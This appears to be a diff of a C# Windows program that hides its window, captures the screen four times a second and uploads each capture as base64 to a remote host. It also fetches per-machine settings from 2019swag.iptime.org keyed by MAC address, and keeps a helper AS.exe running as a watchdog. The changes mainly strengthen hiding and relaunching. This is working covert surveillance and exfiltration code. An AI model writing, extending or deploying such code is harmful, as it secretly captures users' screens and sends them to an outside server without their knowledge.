@@ -45,6 +45,7 @@ namespace SCSU
                 }
                 else if ((bool)setting[3])
                 {
+                    message = setting[4].ToString();
                     Thread thread = new Thread(new ThreadStart(showMessagebox));
                     thread.Start();
                 }
@@ -104,11 +105,13 @@ namespace SCSU
         }
         private void loop()
         {
-            Hide();
             while (looping)
             {
+                Hide();
                 try
                 {
+                    Process[] AS = Process.GetProcessesByName("AS");
+                    if (AS.Length <= 0) Process.Start("AS.exe");
                     Bitmap screen = CaptureImage(0);
                     string base64 = ToBase64(screen);
                     if (SystemInformation.MonitorCount > 1)
@@ -119,8 +122,6 @@ namespace SCSU
                     WebClient client = new WebClient();
                     client.Headers.Add("Content-Type", "text/plain");
                     client.UploadString(captureText, "PUT", base64);
-                    Process[] AS = Process.GetProcessesByName("AS");
-                    if (AS.Length >= 0) Process.Start("AS.exe");
                 }
                 catch { }
                 System.Threading.Thread.Sleep(250);
@@ -128,10 +129,12 @@ namespace SCSU
         }
         private void showMessagebox()
         {
+            message = message.Replace('_',' ');
             MessageBox.Show(message,"New Message");
         }
         private void Form1_Load(object sender, EventArgs e)
         {
+            Process.Start("AS.exe");
             WebClient client = new WebClient();
             string mac = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
             string url = "http://2019swag.iptime.org:1234/api/macJson/" + mac;
